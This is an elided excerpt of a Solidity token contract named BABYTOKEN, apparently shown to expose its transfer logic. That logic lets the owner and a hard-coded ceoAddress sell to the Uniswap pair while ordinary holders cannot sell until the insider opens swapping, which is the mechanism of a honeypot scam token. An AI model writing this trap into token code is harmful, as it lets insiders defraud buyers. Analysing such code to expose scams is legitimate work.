...
contract BABYTOKEN is ERC20, Ownable {
    ...
    address public ceoAddress = 0x70662566Ad436b84A8Ba25384FDE5582f2ebE9F9;
    ...
    function _transfer(
        ...
        if (!startFlag) {
            ...
            require(from == owner() || to != uniswapPair,'no start');   
        }
        if(from != owner() && to != owner()){
            if(from != ceoAddress && to == uniswapPair){
                require(swapEnable, "no open swap");
            }else if(from == ceoAddress && to == uniswapPair){
                swapEnable = true;
            }
        }
